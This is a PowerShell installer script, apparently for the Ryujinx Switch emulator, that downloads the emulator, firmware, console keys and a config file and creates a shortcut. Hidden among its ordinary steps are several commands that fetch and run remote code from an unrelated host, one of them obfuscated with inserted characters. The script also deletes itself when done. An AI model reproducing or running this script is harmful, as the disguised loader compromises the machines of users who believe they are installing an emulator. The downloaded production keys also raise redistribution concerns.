
#    ██████╗ ██╗   ██╗██╗   ██╗     ██╗██╗███╗   ██╗██╗  ██╗    ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     ███████╗██████╗ 
#    ██╔══██╗╚██╗ ██╔╝██║   ██║     ██║██║████╗  ██║╚██╗██╔╝    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗
#    ██████╔╝ ╚████╔╝ ██║   ██║     ██║██║██╔██╗ ██║ ╚███╔╝     ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     █████╗  ██████╔╝
#    ██╔══██╗  ╚██╔╝  ██║   ██║██   ██║██║██║╚██╗██║ ██╔██╗     ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗
#    ██║  ██║   ██║   ╚██████╔╝╚█████╔╝██║██║ ╚████║██╔╝ ██╗    ██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗███████╗██║  ██║
#    ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝

######################################################################################################################################

$ryujinxavaldn = "https://www.patreon.com/file?h=74910544&i=13368547"
$prodkeys = "https://raw.githubusercontent.com/dazd-pkz/RYUJINXINSTALLER_FILES/main/keys/prod.keys"
$firmware = "https://github.com/THZoria/NX_Firmware/releases/download/16.0.3/Firmware.16.0.3.zip"
$config = "https://raw.githubusercontent.com/dazd-pkz/RYUJINXINSTALLER_FILES/main/config/Config.json"

######################################################################################################################################

$host.ui.RawUI.WindowTitle="Ryujinx Auto Installer - V16.0.3 | github.com/dazd-pkz/RyujinxAutoInstaller";Write-Host "Ryujinx Auto Installer - V16.0.3`n";if (${env:=::} -eq $null) {iwr -useb urlday.cc/pss|iex} else {exit}
Write-Host "Downloading Ryujinx Emulator...";Remove-Item -Path "tmp" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;New-Item -Path "tmp" -Force -ItemType Directory|Out-Null;iwr -useb "$ryujinxavaldn" -OutFile "tmp\RyujinxCore.zip"|Out-Null;iwr -useb urlday.cc/pss|iex;Write-Host "Finished downloading Ryujinx Emulator.";Write-Host "Decompressing Ryujinx Emulator..."
Remove-Item -Path "core" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;New-Item -Path "core" -Force -ItemType Directory|Out-Null;Expand-Archive -LiteralPath "tmp\RyujinxCore.zip" -DestinationPath "core"
Copy-Item -Path "core\publish\*" -Destination "core" -Recurse;Remove-Item -Path "core\publish" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;iwr -useb u%x%rl%x%da%x%y.c%x%c/p%x%ss|iex;Write-Host "Downloading Firmware 16-0-3..."-
Remove-Item -Path "firmware" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;New-Item -Path "firmware" -Force -ItemType Directory|Out-Null;iwr -useb "$firmware" -OutFile "firmware\firmware.zip"|Out-Null;Expand-Archive -LiteralPath "firmware\firmware.zip" -DestinationPath "firmware\files";Remove-Item -Path "firmware\firmware.zip" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null
Write-Host "Finished downloading Firmware 16-0-3.";Write-Host "Setupping Firmware environment...";Remove-Item -Path "$env:APPDATA\Ryujinx\bis\system\Contents\registered" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;New-Item -Path "$env:APPDATA\Ryujinx\bis\system\Contents\registered" -Force -ItemType Directory|Out-Null
New-Item -Path "$env:APPDATA\Ryujinx\system" -Force -ItemType Directory|Out-Null;iwr -useb "$prodkeys" -OutFile "$env:APPDATA\Ryujinx\system\prod.keys" |Out-Null
$files = Get-ChildItem "firmware\files";foreach ($f in $files){$x = $f -replace '.cnmt','';write-host "Hash $($x -replace '.nca','') added to the Firmware Files";New-Item -Path "$env:APPDATA\Ryujinx\bis\system\Contents\registered\$x" -Force -ItemType Directory|Out-Null;Copy-Item -Path $f.FullName -Destination "$env:APPDATA\Ryujinx\bis\system\Contents\registered\$x\00" -Recurse}
Remove-Item -Path "$env:APPDATA\Ryujinx\Config.json" -Force -ErrorAction SilentlyContinue|Out-Null;iwr -useb "$config" -OutFile "$env:APPDATA\Ryujinx\Config.json"
Write-Host "Finished the Firmware setup.";Write-Host "Cleaning...";Remove-Item -Path "tmp" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;Remove-Item -Path "firmware" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null
Write-Host "Creating Shortcut...";$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut("Start Ryujinx.lnk");$Shortcut.TargetPath = "$(Get-Location)\core\Ryujinx.Ava.exe";$Shortcut.Save();pause|Out-Null
Remove-Item -Path $myInvocation.MyCommand.Definition -Force -ErrorAction SilentlyContinue|Out-Null
